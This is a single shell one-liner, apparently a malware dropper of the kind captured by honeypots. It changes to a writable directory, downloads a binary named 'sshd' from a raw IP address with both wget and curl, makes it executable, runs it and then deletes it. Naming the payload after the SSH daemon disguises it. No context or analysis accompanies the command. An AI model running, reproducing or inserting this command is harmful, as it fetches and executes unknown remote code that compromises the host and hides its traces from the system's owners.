cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.155.113.105/sshd; curl -O http://107.155.113.105/sshd; chmod +x sshd; ./sshd; rm -rf sshd
